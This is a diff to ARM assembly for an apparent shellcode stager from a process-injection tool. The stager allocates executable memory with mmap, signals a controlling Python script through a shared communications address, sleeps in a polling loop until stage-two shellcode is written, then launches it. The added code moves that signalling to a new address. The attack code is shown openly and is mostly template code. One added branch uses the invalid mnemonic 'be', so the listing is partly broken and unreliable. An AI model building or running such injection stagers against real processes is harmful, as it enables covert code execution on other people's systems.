@@ -1,11 +1,7 @@
 .globl _start
 _start:
 	// Save registers
-	//stmdb sp!,{r0-r12}
 	stmdb sp!,{r0-r11}
-	//stmdb sp!,{lr}
-	//add r6, sp, #0x4
-	//sub sp, sp, #0x20
 	
 	b beginStager
 
@@ -38,12 +34,38 @@ store_rw_block_address:
 [READ_EXECUTE_ALLOCATE_OR_REUSE]
 
 	// Store the read/execute block address returned by mmap
+	// in the initial location
 	mov r9, r12
 	add r9, r9, #4
 	str r10, [r9]
+	
+//also store the r/w and r/x block locations in the new communications address block
+	mov r9, r11
+	add r9, r9, #4
+	str r10, [r9]
+	add r9, r9, #4
+	str r11, [r9]
 
-// overwrite communications address with [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
+// if the old and new communication addresses are different, then 	
+// overwrite initial communications address with [VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]
+// and the address after that with the new communication address 
+// so that the Python script knows the new location
+
+	cmp r12, r11
+	be ready_for_stage2
+	ldr r0, [pc]
+	b store_state_switch_to_new_communication_address
+
+state_switch_to_new_communication_address:
+	.word [VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]
+	.balign 4
+
+store_state_switch_to_new_communication_address:
+	str r0, [r12]
+
+// overwrite communications address at the new location with [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
 // so that the Python script knows it can write stage 2 to memory
+ready_for_stage2:
 
 	ldr r0, [pc]
 	b store_state_ready_for_stage_two_write
@@ -53,7 +75,7 @@ state_ready_for_stage_two_write:
 	.balign 4
 
 store_state_ready_for_stage_two_write:
-	str r0, [r12]
+	str r0, [r11]
 
 // load the value that indicates shellcode written into r8
 	ldr r8, [pc]
@@ -87,7 +109,7 @@ wait_for_script:
 	mov r1, r5  								@ nanoseconds
 	swi 0x0										@ syscall
 
-	ldr r7, [r12]
+	ldr r7, [r11]
 	cmp r7, r8
 	beq launch_stage2
 	
